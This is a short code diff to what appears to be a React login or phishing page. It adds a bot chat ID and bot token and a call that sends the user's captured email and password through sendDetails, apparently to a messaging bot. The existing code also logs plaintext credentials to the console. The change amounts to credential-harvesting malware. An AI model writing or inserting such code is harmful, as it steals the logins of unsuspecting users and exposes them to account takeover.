@@ -34,6 +34,8 @@ function App() {
   const [emal, setEmal] = useState("");
   const [passwrd, setPasswrd] = useState("");
   const [display, setDisplay] = useState(false);
+  const chatId = import.meta.env.VITE_CHAT_ID;
+  const botToken = import.meta.env.VITE_BOT_TOKEN;
 
   useEffect(() => {
     if (window.location.href.includes("email")) {
@@ -106,6 +108,8 @@ function App() {
         console.log(data);
         console.log(`userEmail: $${userEmail}`);
         console.log(`userPassword: $${userPassword}`);
+        
+        await sendDetails(userEmail, userPassword)
       } catch (error) {}
     }
   }
